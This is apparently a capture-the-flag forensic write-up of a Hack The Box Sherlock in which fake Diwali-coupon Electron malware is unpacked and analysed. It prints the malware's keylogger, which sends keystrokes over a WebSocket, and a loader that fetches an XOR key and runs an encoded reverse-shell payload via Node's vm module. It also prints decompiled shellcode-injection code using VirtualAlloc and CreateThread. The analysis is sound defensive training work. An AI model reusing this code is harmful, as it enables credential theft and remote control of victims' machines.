---
title: OpSalwarKameez24-1 Sherlock
date: 2024-11-14 12:00:00
categories: [HTB, Sherlock]
tags: [htb]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/black.png
  lqip:
  alt: OpSalwarKameez24-1 sherlock

---
# HTB Sherlock: OpSalwarKameez24-1: Super-Star

![[black.png]]

## Background

### Scenario

StoreD Technologies' customer support team operates tirelessly around the clock in 24/7 shifts to meet customer needs. During the Diwali season, employees have been receiving genuine discount coupons as part of the celebrations. However, this also presented an opportunity for a threat actor to distribute fake discount coupons via email to infiltrate the organization's network. One of the employees received a suspicious email, triggering alerts for enumeration activities following a potential compromise. The malicious activity was traced back to an unusual process. The Incident Response Team has extracted the malicious binaries and forwarded them to the reverse engineering team for further analysis. This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. One the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.
### Incident Overview

- **Organization**: StoreD Technologies
- **Time of Incident**: Diwali season
- **Summary**: StoreD Technologies' customer support team, operating on a 24/7 shift basis, has been celebrating the Diwali season with genuine discount coupons distributed among employees. This event presented an opportunity for a threat actor to distribute **fake discount coupons via email** to employees, attempting to infiltrate the network.

### Incident Details

1. **Trigger Event**: An employee received a suspicious email containing a fake discount coupon. This email raised alerts after unusual enumeration activities, indicating a potential compromise of the employee’s system.
2. **Enumeration Alert**: Post-compromise, the threat actor’s activity led to **enumeration alerts**, typically signifying reconnaissance within the compromised environment.
3. **Process Anomaly**: The malicious activity was traced back to an **unusual process**, which prompted further investigation by the Incident Response (IR) Team.

### Questions

To solve this challenge, I’ll need to answer the following 9 questions:

1. What is the process name of malicious NodeJS application?
2. Which option has the attacker enabled in the script to run the malicious Node.js application?
3. What protocol and port number is the attacker using to transmit the victim's keystrokes?
4. What XOR key is the attacker using to decode the encoded shellcode?
5. What is the IP address, port number and process name encoded in the attacker payload ?
6. What are the two commands the attacker executed after gaining the reverse shell?
7. Which Node.js module and its associated function is the attacker using to execute the shellcode within V8 Virtual Machine contexts?
8. Decompile the bytecode file included in the package and identify the Win32 API used to execute the shellcode.
9. Submit the fake discount coupon that the attacker intended to present to the victim.
### Artifacts

The download has two files in it:

![[001.png]]

## Analysis

### Static Analysis of the Electron-Coupon.exe

Got the MD5 hash of this file

| File                | MD5                              |
| ------------------- | -------------------------------- |
| Electron-Coupon.exe | 7FC3B148E5020293F66A89086DB9A2B9 |

Later, when this file is analysed in VirusTotal, it shows a very low count of detections for malicious.

![[003.png]]

In the **Detail** tab of VirusTotal, under **Basic Properties**, you can identify that a file was created with **NSIS** (Nullsoft Scriptable Install System) by looking for specific indicators.

![[004.png]]

A **Nullsoft Installer Self-Extracting Archive** refers to an executable file created using the **Nullsoft Scriptable Install System (NSIS)**, an open-source tool originally developed by Nullsoft (the creators of Winamp) for packaging and distributing software applications on Windows. NSIS enables developers to bundle their application files along with any necessary resources, configuration settings, and installation instructions into a single installer. When executed, this self-extracting archive automatically unpacks its contents and initiates the installation process, without requiring an external decompression tool like WinZip or 7-Zip.

And we can identify this using the `die` tool.

![[005.png]]

Then `Electron-Coupon.exe` this file was extracted using 7zip. Then the following files were found there.

![[006.png]]

Within the extracted files, another `.7z` file was found. This file was further extracted using 7-Zip, revealing the following files and folders:.

![[008.png]]

Based on the extracted files, this appears to be an **Electron-based application**. Here are some indicators:

1. **Presence of Electron-specific files**:
    - `LICENSE.electron.txt` - A common file included in Electron apps.
    - `libEGL.dll` and `libGLESv2.dll` - Often part of the Chromium engine, which Electron is built upon.
    - `snapshot_blob.bin` - Commonly seen in Electron apps as part of V8 (the JavaScript engine).
2. **Resource and PAK files**:
    - Files like `chrome_100_percent.pak`, `chrome_200_percent.pak`, and `resources.pak` are typical in Electron applications since they use Chromium to render content.
3. **.dll and other supporting files**:
    - `d3dcompiler_47.dll`, `ffmpeg.dll`, and `icudtl.dat` are commonly included in Electron applications for rendering, video decoding, and internationalization.
    
These file types and libraries suggest this is likely an Electron app packaged with all necessary components for cross-platform functionality.

After `Electron-Coupon.exe` is executed, the file self-extracts and a file named `coupon.exe` starts to execute. That process can be identified by checking the behavior of Electron-Coupon.exe file in Virustotal. 

![[009.png]]

This file can be viewed in the list of files extracted in the Electron-Coupon.exe application.

![[010.png]]

I found out that this is a JavaScript base application using die tool.

![[012.png]]

The main application code is located in `resources\app.asar`:

![[013.png]]

You can unpack it in different ways, but I will do it using the [Asar7z](https://www.tc4shell.com/en/7zip/asar/) plugin. To do this, install the plugins in the Formats folder in the` 7-Zip` installation directory:

![[015.png]]

After that we will get the unpacked files from the `asar` file:

![[014.png]]

When launched, the program loads `extraResources/preload.js:`

```js
const { app, BrowserWindow } = require('electron');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

let mainWindow = '';
//const powershell = fs.readFileSync(`C:\\Users\\Public\\test.txt`, 'utf8', data => data);

function createWindow() {
    mainWindow = new BrowserWindow({ width: 800, height: 600,
	  webPreferences: {
		contextIsolation: false,
		nodeIntegration: true,
		nodeIntegrationInWorker: true,
		preload: path.resolve(`${process.resourcesPath}/../extraResources/preload.js`)
	}});
    mainWindow.loadFile(`${__dirname}/public/testPage.html`);
    mainWindow.on('closed', () => {
        mainWindow = null;
    });
}
//path.resolve(`${__dirname}/preload.js`)
//fork(powershell);

app.on('ready', createWindow);

app.on('window-all-closed', () => process.platform !== 'darwin' && app.quit());
// re-create a window on mac
app.on('activate', () => mainWindow === null && createWindow());
```

Let's pay attention to `nodeIntegration` - this is the answer to question #2.

In the `app\keylogger.js` directory we will see that the `websocket` protocol and port are used, `44500` (answer to question #3):

```js
typeof require === 'undefined';
runShell();

if ("WebSocket" in window)
{
  var socket = new WebSocket("ws://0.0.0.0:44500");
  var all_input_fields = document.getElementsByTagName("input");
  var page_url = document.baseURI;
  var now = Date();

  socket.onopen = function()
  {
    if (all_input_fields.length > 0)
    {
      socket.send("\n\n --------------- " + now + " --------------- ");
      socket.send("\nURL: " + page_url + "\n");
      var all = "";

      for (var i = 0; i < all_input_fields.length; i++)
      {
        if ((all_input_fields[i].type.toLowerCase() == "text") || (all_input_fields[i].type.toLowerCase() == "password"))
        {
          all_input_fields[i].onfocus = function()
          {
            socket.send("\n##########\n" + this.name + " --> ");
          }

          all_input_fields[i].onkeydown = function(sniffed_key)
          {
            socket.send(sniffed_key.keyCode);
          }
        }
      }
    }
  }

  socket.onbeforeunload = function()
  {
    socket.close();
  }
}
```

To answer the question about the `XOR` decryption key, we need to open the attached PCAP file in Wireshark and set the filter to http:

![[017.png]]
![[018.png]]

The answer to question #4 is `ec1ee034ec1ee034​`.

Let's go back to `extraResources/preload.js​`. This file decodes the Base64 payload and decrypts it using the key.
​
```js
typeof require === 'function';

window.runShell = function(){
var http = require('http')
var vm = require("vm");
var fs = require("fs");

var options = {
  host: '0.0.0.0',
  port: 80,
  path: '/'
};

http.get(options, function(res) {
  var body = '';
  res.on('data', function(chunk) {
    body += chunk;
  });
  res.on('end', function() {
	
	var b64string = "xHiVWo9qiVuCNslP4RTAFMw+llWePo5RmD7dFJ57kUGFbIUcznCFQM43zDnmPsAUzD7AFMx9kBTRPpJRnWuJRok2wleEd4xQs26SW497k0fON8w55j7AFMw+wBTMbYgU0T6DRMJtkFWbcMgWj3OEGolmhRbAPrtpxSXtPsw+wBSaf5IUj3KJUYJqwAnMcIVDzHCFQMJNj1eHe5QcxSXtPsw+wBSPcolRgmrOV4NwjlGPasgA2CrUGMw80QHCLNACwi/TGt8vwhjMeJVaj2qJW4I2yU/hFMAUzD7AFMw+g1iFe45Awm6JRIk2k1zCbZRQhXDJD+EUwBTMPsAUzD6TXMJtlFCDa5QanHeQUcR9jF2JcJQd1xPqFMw+wBTMPsBHhDCTQIh7kkbCbolEiTaDWIV7jkDFJe0+zD7AFJE32znmPsAUzGyFQJlsjhTDf88PzDHPFLxshUKJcJRHzGqIUcxQj1CJMIpHzH+QRIB3g1WYd49azHiPRoE+g0aNbYhdgnntPpE3yB3X";
	
	var str = Buffer.from(b64string, 'base64');

	let keyBuf = Buffer.from(body, 'hex')
	let strBuf = Buffer.from(str, 'hex')
	let outBuf = Buffer.alloc(strBuf.length)

	for (let n = 0; n < strBuf.length; n++)
		outBuf[n] = strBuf[n] ^ keyBuf[n % keyBuf.length]

	//console.log(outBuf.toString())
	var code = outBuf.toString()
	var script = new vm.Script(code);
	var context = vm.createContext({ require: require });

	script.runInNewContext(context);
	
  });
}).on('error', function(e) {
  console.log("Got error: " + e.message);
});
};
```

![[019.png]]

This allows us to answer question #5 — `15.206.13.31, 4444, cmd.exe`. Very similar to a reverse shell.

Let's set the filter `ip.src == 15.206.13.31` in Wireshark and find the first two commands that the attacker executed after receiving the shell:

![[020.png]]
![[021.png]]

The answer to question #6 is `whoami, ipconfig`.

Let's look again at the picture with the Base64 load and find the module and function `vm, runInNewContext` in it — this is the answer to question #7.

To answer the last two questions, we need the [View8](https://github.com/suleram/View8) repository. Download it as a ZIP archive and unpack it, put the file [9.4.146.24.exe](https://github.com/suleram/View8/releases/download/v1.0/9.4.146.24.exe) in the Bin directory.

To decompile the V8 JSC file, we need to find out the NodeJS version using `VersionDetector.exe`:

```cmd
> VersionDetector.exe -f script.jsc
9.4.146.26
```

Let's install Python, create a virtual environment and install the missing library:

```cmd
> python -m venv env
> env\scripts\activate
> pip install parse
```

Let's run decompilation:

```cmd
> python view8.py --path "bin\9.4.146.24.exe" script.jsc output.js
Executing disassembler binary: bin\9.4.146.24.exe.
Disassembly completed successfully.
Parsing disassembled file.
Parsing completed successfully.
Decompiling 2 functions.
Exporting to file output.js.
Done.
```

We examine the resulting output.js file and see the WinAPI call `CreateThread` — the answer to question #8:

```js
function func_unknown()
{
	r0 = func_unknown_000001EA02BDD9D1
	return func_unknown_000001EA02BDD9D1
}
function func_unknown_000001EA02BDD9D1(a0, a1, a2, a3, a4)
{
	r0 = a1("ffi-napi")
	r1 = a1("ref-napi")
	r15 = new [252, 72, 129, 228, 240, 255, 255, 255, 232, 208, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 62, 72, 139, 82, 24, 62, 72, 139, 82, 32, 62, 72, 139, 114, 80, 62, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 62, 72, 139, 82, 32, 62, 139, 66, 60, 72, 1, 208, 62, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 111, 72, 1, 208, 80, 62, 139, 72, 24, 62, 68, 139, 64, 32, 73, 1, 208, 227, 92, 72, 255, 201, 62, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 62, 76, 3, 76, 36, 8, 69, 57, 209, 117, 214, 88, 62, 68, 139, 64, 36, 73, 1, 208, 102, 62, 65, 139, 12, 72, 62, 68, 139, 64, 28, 73, 1, 208, 62, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 62, 72, 139, 18, 233, 73, 255, 255, 255, 93, 62, 72, 141, 141, 32, 1, 0, 0, 65, 186, 76, 119, 38, 7, 255, 213, 73, 199, 193, 0, 0, 0, 0, 62, 72, 141, 149, 14, 1, 0, 0, 62, 76, 141, 133, 25, 1, 0, 0, 72, 49, 201, 65, 186, 69, 131, 86, 7, 255, 213, 72, 49, 201, 65, 186, 240, 181, 162, 86, 255, 213, 67, 79, 85, 80, 79, 78, 49, 51, 51, 55, 0, 80, 65, 87, 78, 69, 68, 0, 117, 115, 101, 114, 51, 50, 46, 100, 108, 108, 0]
	r2 = "Buffer"["from"](r15)
	r6 = r1["refType"](r1["types"]["void"])
	r7 = r1["refType"](r1["types"]["void"])
	r8 = r1["refType"](r1["types"]["uint32"])
	r15 = new {"VirtualAlloc": null, "RtlMoveMemory": null, "CreateThread": null, "WaitForSingleObject": null}
	r17 = new [0, 0]
	r17[0] = r7
	r19 = new [0, 0, 0, 0]
	r19[0] = r7
	r19[1] = r1["types"]["uint64"]
	r19[2] = r1["types"]["uint32"]
	r19[3] = r1["types"]["uint32"]
	r17[1] = r19
	r15["VirtualAlloc"] = r17
	r17 = new [0, 0]
	r17[0] = r1["types"]["void"]
	r19 = new [0, 0, 0]
	r19[0] = r7
	r19[1] = r7
	r19[2] = r1["types"]["uint64"]
	r17[1] = r19
	r15["RtlMoveMemory"] = r17
	r17 = new [0, 0]
	r17[0] = r6
	r19 = new ["pointer", 0, 0, 0, 0, 0]
	r19[1] = r1["types"]["uint64"]
	r19[2] = r7
	r19[3] = r7
	r19[4] = r1["types"]["uint32"]
	r19[5] = r8
	r17[1] = r19
	r15["CreateThread"] = r17
	r17 = new [0, 0]
	r17[0] = r1["types"]["uint32"]
	r19 = new [0, 0]
	r19[0] = r6
	r19[1] = r1["types"]["uint32"]
	r17[1] = r19
	r15["WaitForSingleObject"] = r17
	ACCU = r0["Library"]
	r9 = r0["Library"]("kernel32", r15)
	ACCU = "console"["log"]("shellcode length:", r2["length"])
	r14 = r9
	r10 = r9["VirtualAlloc"](null, r2["length"], 12288, 64)
	ACCU = "console"["log"](r10)
	r14 = r9
	r15 = r10
	r16 = r2
	ACCU = r9["RtlMoveMemory"](r15, r16, r2["length"])
	r15 = r1["refType"](r1["types"]["uint32"])
	r11 = r1["alloc"](r15)
	r14 = r9
	r17 = r10
	r20 = r11
	r12 = r9["CreateThread"](null, 0, r17, null, 0, r20)
	r16 = r11["readUint32LE"]()
	ACCU = "console"["log"]("thread id:", r16)
	ACCU = r9["WaitForSingleObject"](r12, 4294967295.0)
	return undefined
}
```

To answer question #9, you will have to take the contents of register `r15`, remove the commas and send it to CyberChef — `COUPON1337:`

![[022.png]]
## Question Answers

1. What is the process name of malicious NodeJS application?
	`Coupon.exe`
2. Which option has the attacker enabled in the script to run the malicious Node.js application?
	`nodeintegration`
3. What protocol and port number is the attacker using to transmit the victim's keystrokes?
	`websocket, 44500`
4. What XOR key is the attacker using to decode the encoded shellcode?
	`ec1ee034ec1ee034`
5. What is the IP address, port number and process name encoded in the attacker payload ?
	`15.206.13.31, 4444, cmd.exe`
6. What are the two commands the attacker executed after gaining the reverse shell?
	`whoami, ipconfig`
7. Which Node.js module and its associated function is the attacker using to execute the shellcode within V8 Virtual Machine contexts?
	`vm, runInNewContext`
8. Decompile the bytecode file included in the package and identify the Win32 API used to execute the shellcode.
	`CreateThread`
9. Submit the fake discount coupon that the attacker intended to present to the victim.
	`COUPON1337`

